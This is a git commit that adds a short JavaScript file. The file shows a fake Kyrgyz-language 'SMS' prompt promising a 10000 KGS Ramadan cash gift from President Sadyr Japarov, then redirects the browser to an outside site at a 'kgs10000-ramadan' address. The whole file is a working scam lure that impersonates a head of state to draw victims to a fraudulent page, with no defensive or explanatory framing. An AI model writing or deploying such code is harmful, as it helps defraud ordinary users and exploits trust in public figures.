ba356714dd95553de7b76ab53210d1a09a5c936d
newetijazz26 <newetijazz26@gmail.com>
2026-02-16 10:23:42 +0100

    Create kyrgyz.js

---
+++ kyrgyz.js
@@ -0,0 +1,5 @@
+var password = '10000 кг алыңыз'
+password = prompt('SMS: Куттуктайбыз, сиз президенттен kgs10000 накталай Рамазан белегин алууга укуктуусуз Sadyr Japarov, азыр сунушту алуу үчүн OK чыкылдатуу','10000 кг алыңыз');
+if (password != '10000 кг алыңыз') {
+    location.href ='https://www.craynrp.site/kgs10000-ramadan';
+}
